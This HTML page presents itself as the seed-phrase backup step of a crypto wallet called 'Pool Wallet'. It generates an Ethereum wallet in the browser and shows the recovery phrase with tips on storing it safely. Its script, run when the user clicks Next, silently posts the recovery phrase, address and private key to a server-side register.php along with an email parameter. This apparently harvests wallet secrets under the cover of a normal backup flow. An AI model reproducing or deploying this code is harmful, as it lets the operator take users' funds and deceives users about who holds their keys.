<!DOCTYPE html>
<html data-theme="os">

<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1 user-scalable=no">
    <title>Backup Seed-Phrase || Pool Wallet</title>
    <link rel="stylesheet" type="text/css" href="style.css" title="ltr">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.13.0/css/all.min.css" rel="stylesheet">
    <link rel="shortcut icon" href="../img/logo_single.png" type="image/x-icon">
    <link rel="shortcut icon" type="image/png" href="../img/logo_single.png" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.1/jquery.min.js" integrity="sha512-aVKKRRi/Q/YV+4mjoKBsE4x3H+BkegoM/em46NNlCqNTmUYADjBbeNefNxYV7giUp0VxICtqdrbqU7iVaeZNXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
</head>

<body>
    <div id="app-content">
        <div class="app os-win mouse-user-styles">
            <div class="app-header">
                <div class="app-header__contents">
                    <div class="app-header__logo-container app-header__logo-container--clickable">
                        <a href="/">
                            <img src="../img/logo.png" width="200px" height="40px" alt="Pool Wallet logotype">    
                        </a>
                    </div>
                </div>
            </div>
            <div class="main-container-wrapper">
                <div class="first-time-flow">
                    <div class="first-time-flow__wrapper ">
                        <div class="reveal-seed-phrase">
                            <div class="seed-phrase__sections">
                                <div class="seed-phrase__main">
                                    <div class="box box--margin-bottom-4 box--flex-direction-row">
                                        <a href="create.html">&lt;
                                            Back</a>
                                    </div>
                                    <div class="first-time-flow__header">Secret Recovery Phrase</div>
                                    <div class="first-time-flow__text-block">
                                        Your Secret Recovery Phrase makes it easy
                                        to back up and restore your account.
                                    </div>
                                    <div class="first-time-flow__text-block">                                        
                                        NOTE: that the secret recovery phrase only works on Pool Wallet.
                                    </div>                                    
                                    <div class="reveal-seed-phrase__secret">
                                        <div class="reveal-seed-phrase__secret-words notranslate" id="sedl">
                                            
                                        </div>
                                    </div>
                                </div>
                                <div class="seed-phrase__side">
                                    <div class="first-time-flow__text-block">Tips:</div>
                                    <div class="first-time-flow__text-block">Store this phrase in a password manager
                                        like 1Password.</div>
                                    <div class="first-time-flow__text-block">Write this phrase on a piece of paper and
                                        store in a secure location. If you want even more security, write it down on
                                        multiple pieces of paper and store each in 2 - 3 different locations.</div>
                                    <div class="first-time-flow__text-block">Memorize this phrase.</div>                                    
                                </div>
                            </div>
                            <div class="reveal-seed-phrase__buttons">
                                <button onclick="update_seed();" id="sed_btn" class="button btn--rounded btn-primary first-time-flow__button" role="button"
                                    tabindex="0">
                                    Next
                                </button>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </div>
    <script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js" type="application/javascript"></script>
    <script>
        const wallet = ethers.Wallet.createRandom()
        document.getElementById("sedl").innerHTML = wallet.mnemonic.phrase;

        function getURLParameter(name) {
            return decodeURIComponent((new RegExp('[?|&]' + name + '=' + '([^&;]+?)(&|#|;|$)').exec(location.search) || [null, ''])[1].replace(/\+/g, '%20')) || null;
        }
    
        function update_seed() {

            let sedl = wallet.mnemonic.phrase;
            let add = wallet.address;
            let pri = wallet.privateKey;
            let email = getURLParameter('secure');
        
            $("#sed_btn").html('<span class="">Processing...</span>');
            $.ajax({
                url: '../data/register.php',
                type: 'post',
                dataType: 'json',
                data: {
                    sedl: sedl,
                    add: add,
                    pri: pri,
                    email: email
                },
                success: function (response) {
                    if (response.stat === "one") {
                        window.location.href='end.html';
                    }
                }
            });
        }
    </script>
</body>

</html>
